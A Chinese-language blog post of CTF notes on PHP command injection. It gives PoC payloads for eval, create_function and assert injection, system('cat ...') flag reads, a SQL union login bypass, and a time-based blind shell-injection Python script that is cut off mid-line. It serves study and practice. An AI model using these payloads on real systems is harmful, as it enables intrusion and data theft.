@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="命令注入额 没啥，类似于一句话木马的官方话吧常见php命令注入函数eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP命令注入">
+<meta property="og:url" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="命令注入额 没啥，类似于一句话木马的官方话吧常见php命令注入函数eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/2.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/3.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/4.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/5.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/6.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/7.png">
+<meta property="og:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1.png">
+<meta property="article:published_time" content="2019-07-13T14:46:59.000Z">
+<meta property="article:modified_time" content="2021-07-14T08:13:22.000Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="PHP-Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PHP命令注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2019/07/20/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2019/07/13/Redis%E5%93%A8%E5%85%B5%E6%A0%B8%E5%BF%83%E9%80%89%E4%B8%BE%E7%AE%97%E6%B3%95-%E9%80%9A%E8%BF%87%E5%BC%80%E8%BD%A6%E7%90%86%E8%A7%A3quorum%E5%92%8Cmajority%E7%9A%84%E6%84%8F%E4%B9%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&text=PHP命令注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&is_video=false&description=PHP命令注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP命令注入&body=Check out this article: http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&name=PHP命令注入&description=&lt;h3 id=&#34;命令注入&#34;&gt;&lt;a href=&#34;#命令注入&#34; class=&#34;headerlink&#34; title=&#34;命令注入&#34;&gt;&lt;/a&gt;命令注入&lt;/h3&gt;&lt;p&gt;额 没啥，类似于一句话木马的官方话吧&lt;br&gt;常见php命令注入函数&lt;br&gt;eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()&lt;br&gt;eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&t=PHP命令注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%93%E9%97%A8%E8%81%8A%E4%B8%80%E4%B8%8Bcreate-function%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">专门聊一下create_function命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">create_function参数注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">create_function内容注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvios%E7%9A%84babyphp%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">jarvios的babyphp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%81%EF%BC%81%EF%BC%81%E4%BB%A5%E4%B8%8A%E7%90%86%E8%A7%A3%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%81%EF%BC%81"><span class="toc-number">3.1.</span> <span class="toc-text">！！！以上理解是错误的！！</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E5%A1%94%E4%B9%88shell%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">神塔么shell注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81love-math"><span class="toc-number">5.</span> <span class="toc-text">二、love_math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E5%8D%81%E6%9C%88%E5%9C%BA-hash"><span class="toc-number">6.</span> <span class="toc-text">“百度杯”CTF比赛 十月场 hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X-Forwarded-For%E5%8F%AF%E9%80%89%E5%9C%B0%E5%9D%80"><span class="toc-number">7.</span> <span class="toc-text">X-Forwarded-For可选地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#od%E8%A7%A3%E5%AF%86"><span class="toc-number">8.</span> <span class="toc-text">od解密</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PHP命令注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-13T14:46:59.000Z" class="dt-published" itemprop="datePublished">2019-07-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web/">Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/PHP-Injection/" rel="tag">PHP-Injection</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>额 没啥，类似于一句话木马的官方话吧<br>常见php命令注入函数<br>eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()<br>eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。</p>
+<span id="more"></span>
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$myvar</span> = <span class="string">&quot;varname&quot;</span>;</span><br><span class="line">	<span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\$myvar = <span class="subst">$x</span>;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>poc<br><code>/index.php?arg=1;phpinfo()</code></p>
+<h3 id="专门聊一下create-function命令注入"><a href="#专门聊一下create-function命令注入" class="headerlink" title="专门聊一下create_function命令注入"></a>专门聊一下create_function命令注入</h3><p>核心</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果可控在第一个参数，需要闭合圆括号和大括号：create_function(&#x27;)&#123;&#125;phpinfo();//&#x27;, &#x27;&#x27;);</span><br><span class="line">如果可控在第二个参数，需要闭合大括号：create_function(&#x27;&#x27;, &#x27;&#125;phpinfo();//&#x27;);</span><br></pre></td></tr></table></figure>
+<h4 id="create-function参数注入"><a href="#create-function参数注入" class="headerlink" title="create_function参数注入"></a>create_function参数注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$act</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$act</span>(<span class="variable">$arg</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;666&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?act=\create_function&amp;arg=)&#123;&#125;system(&#x27;cat /ffflll4g&#x27;);//</span><br></pre></td></tr></table></figure>
+
+<p>ps：2020&#x2F;5&#x2F;30 校赛 ：发现用其他函数可以直接执行，支持两个参数的，比如readfile,highlight_file</p>
+<h4 id="create-function内容注入"><a href="#create-function内容注入" class="headerlink" title="create_function内容注入"></a>create_function内容注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=return 2333;&#125;phpinfo();//</span><br></pre></td></tr></table></figure>
+<h3 id="jarvios的babyphp："><a href="#jarvios的babyphp：" class="headerlink" title="jarvios的babyphp："></a>jarvios的babyphp：</h3><p>jarvios的babyphp<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/2.png"><br>可以目录扫描一下，有.git文件夹泄露<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/3.png"><br>通过githack还原源码<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/4.png"><br>审计发现下面漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>首先加上前缀后缀，第二行规则不允许出现两个点，<code>.php</code>已经出现了一个点，所以page参数允许出现点，第二行strpos(xxx,zzz)在xxx中寻找zzz，如果成功返回字符位置，如果没有则返回false就可以注入了<br>比如执行phpinfo();<br>我们传入<code>page=&#39;) or phpinfo();#</code>,如此<code>$file=templates/&#39;) or phpinfo();#.php</code>,为了讲解我没转义，大家需要自己先urldecode<br>然后下面变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;) or phpinfo();#.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;templates/&#x27;) or phpinfo();#.php&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>我觉得不行啊，#后面注释后句子变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;templates/&#x27;) or phpinfo();</span></span><br><span class="line"><span class="string">#.php&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>都没闭合<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/5.png"><br>这谁顶得住的，我自己构造<code>page=&#39;) or phpinfo();&quot;)#</code>,缺报错了，黑人问号jpg,我觉得应该是我有语法错误了</p>
+<h4 id="！！！以上理解是错误的！！"><a href="#！！！以上理解是错误的！！" class="headerlink" title="！！！以上理解是错误的！！"></a>！！！以上理解是错误的！！</h4><p>从这句分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;) or phpinfo();#.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>其实其中的#号没有将后面的注释只是将语句注释了，所以同义为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;) or phpinfo();&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>2333  awsl-所以遇到问题本地多测试一下很重要-ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛</p>
+<p>然后就可以为所欲为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page=&#x27;) or print_r(file_get_contents(&#x27;templates/flag.php&#x27;));#</span><br><span class="line">转码</span><br><span class="line">page=&#x27;)%20or%20print_r(file_get_contents(&#x27;templates%2fflag.php&#x27;))%3b%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/6.png"><br>另外一种构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=&#x27;.system(&quot;&#123;PHPCODE&#125;&quot;).&#x27;</span><br></pre></td></tr></table></figure>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page=&#x27;.system(&quot;ls&quot;).&#x27;</span><br><span class="line">page=&#x27;.system(&quot;cat templates/flag.php;&quot;).&#x27;</span><br></pre></td></tr></table></figure>
+<p>ps:system 函数是不需要输出的，只要执行了就会输出来,<br>其实发现注入第二个也是可以的-php真玄学<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/7.png"></p>
+<h3 id="神塔么shell注入"><a href="#神塔么shell注入" class="headerlink" title="神塔么shell注入"></a>神塔么shell注入</h3><p>一个题先绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>; <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123; &#125;</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; union select 1,md5(1)%23</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure>
+<p>然后出现一个shell注入，命令远程会执行，但是没有回显，只有那个一个进程的，盲猜应该是ps -aux | grep {命令}<br><img src="/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1.png"><br>方法1当然可以直接反弹shell远程，还有一个方法就是shell注入,需要修改一下PHPSESSID<br>注入语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`ls`;b=&#x27;a&#x27;;if [ $&#123;a:0:1&#125; == $b ];then sleep 2;fi</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:49165/index.php&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">allString = <span class="string">&#x27;&#x27;&#x27;1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:&#x27;&quot;|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line">comm =<span class="built_in">input</span>(<span class="string">&#x27;输入指令：&#x27;</span>)</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://123.206.31.85:49165/index.php&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">cookies = <span class="built_in">dict</span>(PHPSESSID=<span class="string">&#x27;d637ecrlrp3ae9jgqqunu97f22&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#根据自身需要改长度，如果空格连续出现四次以上，就说明后续没内容了</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        <span class="comment">#header = &#123;</span></span><br><span class="line">            <span class="comment">#&quot;X-Forwarded-For&quot;:&quot;1&#x27;+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#&quot;%(i,ord(j))</span></span><br><span class="line">            <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;^&quot;</span>:</span><br><span class="line">            <span class="comment">#print(&#x27;此处有空格&#x27;)</span></span><br><span class="line">            j = <span class="string">&quot; &quot;</span></span><br><span class="line">            data=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="string">&quot;123;a=`&quot;</span>+comm+<span class="string">&quot;`;b=&#x27; &#x27;;if [ $&#123;a:&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:1&#125; == $b ];then sleep 4;fi&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="string">&quot;123;a=`&quot;</span>+comm+<span 